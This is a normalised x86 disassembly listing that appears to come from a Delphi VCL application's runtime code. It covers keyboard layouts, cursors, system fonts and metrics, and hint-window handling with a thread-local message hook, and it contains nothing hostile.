mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_46a87c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420f48
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46ac20
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46ac2c
mov eax ebx
call sub_46ac38
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_467054
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4242d0
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4242d0
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4242d0
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_46b0a0
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46af7c
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46af7c
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46af7c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_46a9d4
push ebx
push esi
push edi
push ebp
call sub_403674
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_4032a8
mov eax [ ebp + 0x88 ]
call sub_4032a8
mov eax [ ebp + 0x84 ]
call sub_4032a8
mov eax [ ebp + 0x54 ]
call sub_4032a8
mov eax [ ebp + 0x50 ]
call sub_4032a8
mov eax [ ebp + 0x4c ]
call sub_4032a8
mov eax [ ebp + 0x30 ]
call sub_4032a8
mov eax [ ebp + 0x34 ]
call sub_4032a8
mov eax [ ebp + 0x7c ]
call sub_4032a8
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_4032a8
mov eax ebp
call sub_46ac94
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_420f94
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40365c
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4188d4
call sub_4032a8
inc edi
dec esi
jne r-xdata
sub_46ab4c
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_46ab98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418778
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418778
mov eax [ rw-data ]
call sub_46d9c8
sub_46abd0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418a70
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418a70
mov eax [ rw-data ]
call sub_46d9c8
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_454690
sub_46ac38
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_46ad38
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_46ac94
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026ec
mov ebx esi
test ebx ebx
jne r-xdata
sub_46acf0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
xor eax eax
mov [ esp ] eax
mov eax edi
call sub_46aaf8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_46aae4
mov [ esp ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_46aae4
cmp ebp [ eax + 0x4 ]
jne r-xdata
sub_46ad38
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026cc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_46ad60
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46af0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46af12
lea eax [ ebp - 0x260 ]
call sub_404038
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_404038
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41af48
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_40909c
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_457e44
test al al
je r-xdata
xor eax eax
push ebp
push sub_46aec7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4042a8
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4042a8
sub_46af7c
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_46d838
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46d5ec
mov dl 0x1
mov eax [ rw-data ]
call sub_46d5ec
sub_46afe8
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_46b010
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_46afe8
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406d38
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406c90
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46b0a0
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_46b1e5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46d5ec
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_424660
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_424660
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_424744
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_424660
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_424660
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_424660
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_46d5ec
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_4244a4
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_4244a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b1ec
cmp [ rw-data ] 0x0
je r-xdata
sub_46b224
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_46b284
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_46b3c0 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_46b434
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46ab44
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4188d4
mov dl [ ebp - 0x1 ]
call sub_46b284
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_46ab30
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418778
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_418950
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4188d4
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_46b224
test al al
je r-xdata
inc esi
sub_46b580
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46ab44
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_46ab30
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_46b5d8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_46b580
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46b652
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_46b434
pop ecx
push ebp
mov al 0x2
call sub_46b434
pop ecx
push ebp
mov al 0x3
call sub_46b434
pop ecx
push ebp
mov al 0x4
call sub_46b434
pop ecx
push ebp
mov al 0x5
call sub_46b434
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032a8
retn
sub_46b660
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46b1f4
xor eax eax
push ebp
push sub_46b6d9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46b5d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_46b1fc
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_46b6f4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_404038
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_40408c
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_46b74c
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_403788#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_46dbf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_46b7a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_44b0c4
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_46dc70
sub_46b7fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46cd10
sub_46b840
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_46b7fc
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_46b7a0
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_46b8b4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_46b910
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_46b940
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_46b968
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_46b910
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_46b940
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_46b940
sub_46b998
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
push [ esi + 0x4 ]
push [ esi ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax edi
call sub_46acf0
pop edi
pop esi
pop ebx
retn
sub_46b9c8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax edi
call sub_46acf0
pop edi
pop esi
pop ebx
retn
sub_46ba04
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420f48
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46d0dc
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
